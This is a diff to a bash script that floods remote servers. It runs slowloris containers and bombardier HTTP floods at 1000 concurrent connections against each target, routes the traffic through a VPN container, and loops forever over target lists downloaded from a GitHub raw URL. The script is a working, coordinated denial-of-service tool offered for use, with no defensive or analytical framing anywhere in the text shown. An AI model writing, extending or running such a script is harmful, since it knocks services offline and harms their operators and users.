@@ -48,15 +48,24 @@ while [ $counter -lt $noofelements ]
 do
     docker run --rm -d aminvakil/slowloris ${myarray[$counter]}
     sleep 15
-    docker run --rm -d aminvakil/slowloris ${myarray[$counter]}
-    sleep 15
-    docker run --rm -d aminvakil/slowloris ${myarray[$counter]}
-    sleep 15
-    docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 1000 -d $TIME -l ${myarray[$counter]}
-    sleep 15
-    docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 1000 -d $TIME -l ${myarray[$counter]}
-    sleep 15
-    docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 1000 -d $TIME -l ${myarray[$counter]}
-    sleep 15
+
     counter=$(( $counter + 1 ))
+done
+
+while TRUE
+do
+    wget -O list.txt https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/$fileName.txt
+    myarray=(`cat list.txt`)
+    noofelements=${#myarray[*]}
+    counter=0
+    while [ $counter -lt $noofelements ]
+    do
+        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 1000 -d $TIME -l ${myarray[$counter]}
+        sleep 15
+        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 1000 -d $TIME -l ${myarray[$counter]}
+        sleep 15
+        docker run --net=container:vpn -ti --rm -d alpine/bombardier -c 1000 -d $TIME -l ${myarray[$counter]}
+        sleep 15
+        counter=$(( $counter + 1 ))
+    done
 done
